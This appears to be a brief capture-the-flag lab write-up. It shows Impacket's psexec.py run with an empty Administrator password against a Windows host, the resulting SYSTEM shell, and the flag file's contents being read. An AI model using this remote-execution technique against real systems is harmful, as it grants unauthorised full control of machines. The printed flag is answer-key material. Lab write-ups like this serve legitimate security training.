# Getting access using PSEXEC

Location

`/usr/share/doc/python3-impacket/examples/psexec.py`

Command:

`python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator:""@10.129.51.254`

```
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.129.51.254.....
[*] Found writable share ADMIN$
[*] Uploading file hnDAUzED.exe
[*] Opening SVCManager on 10.129.51.254.....
[*] Creating service QdNc on 10.129.51.254.....
[*] Starting service QdNc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

We then locate the flag

```
 Directory of C:\Users\Administrator\Desktop

04/22/2021  12:16 AM    <DIR>          .
04/22/2021  12:16 AM    <DIR>          ..
04/23/2021  02:39 AM                32 flag.txt
               1 File(s)             32 bytes
               2 Dir(s)   4,745,420,800 bytes free

C:\Users\Administrator\Desktop> type flag.txt
f751c19eda8f61ce81827e6930a1f40c
```
